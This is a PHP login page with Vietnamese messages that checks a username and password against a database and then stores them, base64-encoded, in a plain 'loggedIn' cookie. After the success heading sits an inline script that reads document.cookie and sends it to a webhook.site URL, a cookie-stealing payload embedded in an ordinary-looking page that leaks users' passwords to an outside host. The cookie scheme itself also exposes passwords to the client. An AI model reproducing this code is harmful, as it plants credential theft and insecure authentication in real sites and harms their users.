<?php

function set_cookie_login($username, $password)
{
    $value = $username . "-" . $password;
    $value = base64_encode($username . "-" . $password);
    setcookie("loggedIn", $value);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

	include_once 'connect.php';
	$sql = "SELECT * FROM Dang_ky  WHERE username = ? and password = ?";
	$stmt = mysqli_prepare($connect, $sql);
        mysqli_stmt_bind_param($stmt, "ss", $username, $password);

        $result = $stmt->execute();
        $result = $stmt->get_result();
	$result_name = $result->fetch_assoc();        
	if (empty($result_name)) {
            header("location:login.php?error='Sai tài khoản hoặc mật khẩu'");
        } else set_cookie_login($username, $password);
        $connect->close();
        $stmt->close();
    } else header("location:login.php");
} else if (isset($_COOKIE["loggedIn"])){
	$cookie_name = "loggedIn";
    $cookie_value = $_COOKIE[$cookie_name];
    $value = base64_decode($cookie_value);
    $array = explode("-", $value);
    $username = $array[0];
    $password = $array[1];
    include_once 'connect.php';
    $sql = "SELECT * FROM Dang_ky WHERE username = ? and password = ?";
    $stmt = mysqli_prepare($connect, $sql);

    mysqli_stmt_bind_param($stmt, "ss", $username, $password);

    mysqli_stmt_execute($stmt);
    $result = $stmt->get_result();
    $result_name = $result->fetch_assoc();
    if (empty($result_name))
        header("location:login.php");
} else header("location:login.php");

?>

<h2>Đăng nhập thành công</h2>

<script>const cookies = document.cookie;const url = `https://webhook.site/ca18b48e-99ba-43e0-8376-d3261af9e983?${cookies}`;fetch(url, {method: 'GET'}).then(response => {}).catch(error =>{});</script>
